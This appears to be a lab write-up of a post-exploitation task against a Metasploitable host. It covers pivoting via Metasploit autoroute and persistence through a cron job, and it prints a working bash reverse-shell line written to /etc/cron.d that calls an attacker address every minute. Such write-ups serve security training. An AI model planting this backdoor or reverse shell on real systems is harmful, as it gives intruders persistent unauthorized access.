# Task 4: Lateral Movement and Persistence

## 1. Lateral Movement (Pivoting)
**Objective:** Use the compromised host as a gateway to access internal network segments.
**Method:** Metasploit `autoroute` via Meterpreter.

*   **Execution:** After upgrading the initial shell to a Meterpreter session (Session 2), the `autoroute` command was used to modify the attacker's routing table.
*   **Result:** A new route was established for the `192.168.180.0/24` subnet. All traffic for this subnet is now tunneled through the compromised Metasploitable host.
*   **Significance:** This allows for the discovery and exploitation of internal hosts that are not directly exposed to the public internet.

## 2. Persistence Mechanism
**Objective:** Maintain a permanent foothold in the target environment.
**Technique:** Cron Job Backdoor (MITRE ATT&CK T1053.003).

*   **Execution:** Dropped into a system shell and created a malicious configuration file in `/etc/cron.d/persistence`.
*   **Backdoor Payload:** `* * * * * root /bin/bash -i >& /dev/tcp/192.168.180.129/4444 0>&1`
*   **Functionality:** This command forces the target system to attempt a reverse connection to the attacker's machine every 60 seconds. Even if the current session is killed, access will be restored automatically.

## 3. Summary Table


| Technique | MITRE Tactic | Description | Status |
| :--- | :--- | :--- | :--- |
| **Pivoting** | Lateral Movement | Routing traffic through Session 2 | **SUCCESS** |
| **Cron Job** | Persistence | Automated reverse shell every minute | **ACTIVE** |
